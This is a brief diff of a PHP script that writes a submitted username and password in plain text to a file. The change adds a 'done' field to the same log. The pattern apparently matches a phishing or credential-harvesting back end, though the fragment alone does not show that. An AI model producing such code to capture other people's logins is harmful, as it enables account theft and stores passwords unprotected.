@@ -7,5 +7,7 @@ fwrite($file,"username : ");
 fwrite($file,$username ."\n");
 fwrite($file,"password : ");
 fwrite($file, $password ."\n");
+fwrite($file,"done");
+fwrite($file,$done . "\n");
 fclose($file);
 ?>
